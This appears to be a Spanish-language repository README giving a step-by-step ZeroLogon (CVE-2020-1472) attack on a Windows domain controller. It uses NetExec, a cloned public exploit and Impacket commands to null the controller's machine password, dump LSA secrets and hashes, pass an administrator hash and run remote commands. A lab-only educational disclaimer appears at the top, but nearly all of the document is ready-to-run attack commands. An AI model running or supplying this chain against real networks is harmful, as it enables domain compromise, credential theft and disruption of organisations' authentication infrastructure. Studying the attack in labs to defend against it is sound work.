# Ataque ZeroLogon (CVE-2020-1472) usando NetExec (nxc) + VoidSec + Impacket

Este repositorio documenta paso a paso cómo ejecutar el ataque **ZeroLogon** utilizando `NetExec` (antes CrackMapExec), el exploit de [VoidSec](https://github.com/VoidSec/CVE-2020-1472) y herramientas de Impacket.

---

## ⚠️ Importante

> Esta guía es solo para fines **educativos** y debe usarse únicamente en laboratorios controlados con permiso explícito. **NO** ejecutes este procedimiento en redes productivas.

---

## Requisitos

- Controlador de dominio sin parches para CVE-2020-1472.
- Máquina atacante con:
  - Linux o WSL.
  - Python 3.
  - NetExec (`nxc`), Impacket y Git instalados.

---

## Paso a paso del ataque

### 1. Verificar conectividad SMB con el DC

```bash
nxc smb 10.0.0.10
```

Repetir si es necesario para confirmar acceso:

```bash
nxc smb 10.0.0.10
```

---

### 2. Explotar ZeroLogon con NetExec

```bash
nxc smb 10.0.0.10 -u '' -p '' -M zerologon
```

Este módulo intenta autenticar usando claves nulas y explotar la vulnerabilidad en Netlogon.

---

### 3. Clonar el exploit de VoidSec

```bash
git clone https://github.com/VoidSec/CVE-2020-1472
cd CVE-2020-1472
```

---

### 4. Cambiar la contraseña de la cuenta de equipo del DC

```bash
python3 cve-2020-1472-exploit.py
```

O usar argumentos manuales:

```bash
python3 cve-2020-1472-exploit.py -t 10.0.0.10 -n DC01
```

---

### 5. Volcar hashes con Impacket

```bash
impacket-secretsdump 'LAHERMANADEFRAN/DC01$@10.0.0.10'
```

Esto permite obtener los secretos de LSA y hash de administrador.

---

### 6. Validar acceso como máquina y luego como administrador

```bash
nxc smb 10.0.0.10 -u 'DC01$' -p '' --lsa
```

Con hash de administrador (por ejemplo):

```bash
nxc smb 10.0.0.10 -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' --lsa
```

---

### 7. Restaurar la contraseña original del DC (opcional)

```bash
python3 reinstall_original_pw.py
```

O con argumentos:

```bash
python3 reinstall_original_pw.py DC01$ 10.0.0.10 <HASH_LARGO>
```

---

### 8. Validar acceso final con hash NTLM

```bash
impacket-secretsdump 'LAHERMANADEFRAN/DC01$@10.0.0.10'
```

---

### 9. Ejecutar comando remoto como administrador

```bash
nxc smb 10.0.0.10 -u 'administrator' -H 'b8f81826afbf8feae22924970055d318' -x whoami
```

---

## ¿Qué hicimos?

- Usamos `nxc` para aprovechar la vulnerabilidad en Netlogon.
- Reemplazamos la contraseña de la cuenta del DC con una contraseña nula.
- Extraímos hashes y secretos del sistema.
- Accedimos remotamente como administrador de dominio.
- Finalmente restauramos el estado original (opcional).

---

## Referencias

- [ZeroLogon CVE-2020-1472 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)
- [VoidSec CVE-2020-1472 Exploit](https://github.com/VoidSec/CVE-2020-1472)
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec)
- [Impacket](https://github.com/SecureAuthCorp/impacket)

---

## Autor

Explicación elaborada por [Tu Nombre] para propósitos didácticos y de investigación en ciberseguridad ofensiva.
